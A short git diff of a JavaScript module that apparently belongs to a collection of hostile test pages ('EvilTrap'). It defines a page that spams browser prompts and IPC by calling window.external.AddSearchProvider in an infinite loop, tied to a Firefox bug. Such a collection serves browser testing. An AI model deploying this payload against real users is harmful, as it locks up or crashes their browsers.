@@ -1,7 +1,7 @@
 const EvilTrap = require('../../EvilTrap');
 
 
-module.exports = new EvilTrap('addSearchProvider Prompt Spam', EvilTrap.CATEGORY.PROMPTSPAM, 'Spams prompts by calling window.external.addSearchProvider.', { firefox: '615761' })
+module.exports = new EvilTrap('addSearchProvider Prompt Spam', EvilTrap.CATEGORY.PROMPTSPAM, 'Spams prompts and IPC by calling window.external.addSearchProvider.', { firefox: '615761' })
   .routeBuilder((router) => {
     router.get('/opensearch.xml', (req, res) => {
       res.set('Content-Type', 'text/xml');
@@ -19,6 +19,7 @@ module.exports = new EvilTrap('addSearchProvider Prompt Spam', EvilTrap.CATEGORY
   .addScriptPage(() => {
     function spamAddSearchProvider(uri, { overloadIPC = false, intervalMS = 500 } = {}) {
       if (overloadIPC) {
+        // eslint-disable-next-line no-constant-condition
         while (true) {
           window.external.AddSearchProvider(uri);
         }
